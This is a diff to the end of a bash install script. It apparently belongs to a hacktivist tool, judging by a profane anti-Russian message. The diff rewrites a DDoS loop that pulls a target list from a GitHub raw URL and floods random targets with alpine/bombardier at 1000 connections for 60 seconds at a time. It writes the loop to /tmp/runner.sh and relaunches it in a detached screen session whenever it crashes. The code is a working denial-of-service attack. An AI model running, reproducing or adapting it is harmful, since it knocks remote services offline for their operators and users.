@@ -636,31 +636,34 @@ else
 	do_install
 fi
 
-
-echo "Русский корабль, иди нахуй! Можно отсоединяться, дальше я сам :)"
-screen -dm bash -c '
+echo '
+#!/bin/bash
 while true
 do
-	readarray -t list < <(curl https://raw.githubusercontent.com/dmitryshagin/targets/main/list)
-	targets_count=${#list[@]}
-	top_20_count=$(( targets_count*20/100 ))
+  readarray -t list < <(curl https://raw.githubusercontent.com/dmitryshagin/targets/main/list)
+  targets_count=${#list[@]}
+  top_20_count=$(( targets_count*20/100 ))
 
-	let top_20_count="$targets_count/2"
-	let remaining_count="$targets_count - $top_20_count - 1"
+  let top_20_count="$targets_count/2"
+  let remaining_count="$targets_count - $top_20_count - 1"
 
-	top_20=( "${list[@]:0:$top_20_count}" )
-	remaining=( "${list[@]:$top_20_count:$remaining_count}" )
+  top_20=( "${list[@]:0:$top_20_count}" )
+  remaining=( "${list[@]:$top_20_count:$remaining_count}" )
 
-	for i in {1..5}
-	do
-	  if [ $(($RANDOM%10)) -lt 7 ]; then
-	   target=${top_20[RANDOM%${#top_20[@]}]}
-	  else
-	   target=${remaining[RANDOM%${#remaining[@]}]}
-	  fi
-	  echo "$target"
-	  docker run -it alpine/bombardier -c 1000 -d 60s -l "$target"
-	  sleep 3;
-	done
+  for i in {1..5}
+  do
+    if [ $(($RANDOM%10)) -lt 7 ]; then
+      target=${top_20[RANDOM%${#top_20[@]}]}
+    else
+      target=${remaining[RANDOM%${#remaining[@]}]}
+    fi
+    echo "$target"
+    docker run -it alpine/bombardier -c 1000 -d 60s -l "$target"
+    sleep 3;
+  done
 done
-'
+' > /tmp/runner.sh
+chmod +x /tmp/runner.sh
+
+screen -AmdS script bash -c 'until /tmp/runner.sh; do echo "Crashed with exit code $?. Restaring."; sleep 1; done'
+echo "Русский корабль, иди нахуй! Можно отсоединяться, дальше я сам :)"
